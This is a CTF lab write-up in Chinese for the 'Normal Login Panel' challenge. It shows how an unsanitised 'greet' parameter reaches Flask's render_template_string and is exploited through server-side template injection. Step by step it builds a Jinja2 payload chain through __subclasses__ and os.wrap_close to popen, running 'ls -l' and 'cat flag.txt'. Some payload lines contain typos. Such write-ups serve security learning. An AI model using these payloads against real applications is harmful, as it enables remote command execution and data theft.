# lab_Normal Login Panel_Flag2

1. 這題是要利用上一題得到的 FLAG 當成 admin 的密碼後，就可以成功登入這個系統， 就可以看到這題的 code。
    
    ![截圖 2022-12-19 上午2.04.01.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25882.04.01.png)
    

1. 然後觀察一下程式可以看到程式登入後的行為，可以去 Trace 這一段程式碼，可以大概知道程式的流程。程式登入之後，會去get user name 跟 password，然後丟進 de.seesion.execute，如果登入成功就會進入 login 函數，登入失敗就會回傳 “USer doesn’t exist!”，然後登入成功的話 login function 會去存取 greet 這個參數，假設 geet 參數存在就會把 Hello {greet} 放進render_template_string 函數並回傳。

![截圖 2022-12-19 上午2.19.44.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25882.19.44.png)

1. 接下來去 Burp Suite 嘗試加入 greet=12345 這個參數跟值，並發出 request來觀察回傳值，可以看到 Server 端會直接回傳 Hello 12345 ，然後嘗試傳 greet={{5*8}}，Server 端會回傳 Hellow 40，到這邊已經可以任意執行想要的內容。

![截圖 2022-12-29 下午6.48.05.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25886.48.05.png)

![截圖 2022-12-29 下午6.51.26.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25886.51.26.png)

1. 接下來就是去找要執行的物件內容，以下就是我一個step byt step by 去找 Object 的過程，然後觀察回傳值來尋找跟思考下一個 Object，並將它加入 greet 的 path，最後就會取得 FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}
    - Set "greet={{[].__class__}}"
    
    ![截圖 2022-12-29 下午7.15.03.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.15.03.png)
    
    - Set "greet={{[].__class__}}"
    
    ![截圖 2022-12-29 下午7.11.03.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.11.03.png)
    
    - Set "greet={{[].__class__.__base__)}}"
    
    ![截圖 2022-12-29 下午7.10.49.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.10.49.png)
    
    - Set "greet={{[].__class__.__base__.__subclasses__()}}"，然後找到 <class ‘os.wrap_close‘> 的 index 是 140。
    
    ![截圖 2022-12-29 下午7.09.59.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.09.59.png)
    
    - Set "greet={{[].__class__.__base__.__subclasses__()[140]}}"
    
    ![截圖 2022-12-29 下午7.10.21.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.10.21.png)
    
    - Set "greet={{[].__class__.__base__.__subclasses__()[140].__init__.}}"
    
    ![截圖 2022-12-29 下午7.09.34.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.09.34.png)
    
    - Set "greet={{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}}"
    
    ![截圖 2022-12-29 下午7.09.16.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.09.16.png)
    
    - Set “greet={{[].__class__.__base__.__subclasses__([140].__init__.__globals__.popen('ls -l').read()}}”，到這邊基本上就可以任意執行指令了。
    
    ![截圖 2022-12-29 下午7.21.53.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.21.53.png)
    
    - Set "greet={{[].__class__.__base__.__subclasses__()[140].__init__.__globals__.popen('cat flag.txt').read()}}"
    
    ![截圖 2022-12-29 下午7.08.42.png](lab_Normal%20Login%20Panel_Flag2%20740f2d4881da458988a655ba561bb82f/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25887.08.42.png)